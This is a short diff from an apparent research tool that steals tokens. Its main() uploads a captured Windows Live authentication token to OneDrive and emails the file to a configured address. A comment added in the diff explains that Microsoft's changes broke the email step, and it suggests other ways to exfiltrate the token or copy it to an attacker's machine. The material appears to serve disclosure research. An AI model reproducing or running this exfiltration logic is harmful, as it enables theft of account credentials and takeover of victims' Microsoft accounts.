@@ -34,6 +34,15 @@ def main():
     print("Uploading token to OneDrive")
     onedrive_token_file_item = onedrive_session.create_file(f"/{configs[ConfigKey.TOKEN_FILE_NAME.value]}", windows_live_token)
     print("Sending token file to the configured email address using OneDrive API")
+
+    # This function used to send an email to the target email address with a link to access the shared file, even if it was an email
+    # address that is not linked to a Microsoft account. Last I checked OneDrive changed some things as a result of this research and
+    # for some reason using this API request does not longer sends the email message but only gives access to the Microsoft account
+    # that belongs to the target email. It seems like the OneDrive Android app still uses this API even though it partially doesn't work.
+    # Regarding the OneDrive's web version, Microsoft changed it to use the Microsoft Graph API instead which is not supported with the
+    # WLID token. Therefore, you can choose to exfiltrate the token in other ways or use a target email that has a Microsoft account and
+    # access the file by listing files that were shared with this Microsoft account. For testing purposes, you can also of course just
+    # print the token and copy it to the attackers machine
     onedrive_session.send_item_to_email(onedrive_token_file_item, configs[ConfigKey.TOKEN_DST_EMAIL_ADDRESS.value])
     
 
